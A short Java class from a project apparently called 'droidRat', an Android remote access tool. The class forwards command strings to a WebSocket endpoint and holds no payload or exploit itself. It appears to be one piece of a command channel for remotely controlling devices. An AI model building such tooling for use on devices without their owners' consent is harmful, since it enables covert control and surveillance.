package com.je_chen.droidRat.module.process.send.command.process;

import com.je_chen.droidRat.module.WebSocketServerEndPoint;
import com.je_chen.droidRat.module.process.send.command.process_super.CommandFather;

public class SendCommand extends CommandFather {

    private final WebSocketServerEndPoint webSocketServerEndPoint;

    public SendCommand(WebSocketServerEndPoint webSocketServerEndPoint) {
        this.webSocketServerEndPoint = webSocketServerEndPoint;
    }

    @Override
    public void processCommand(String command) {
        this.webSocketServerEndPoint.sendText(command);
    }
}
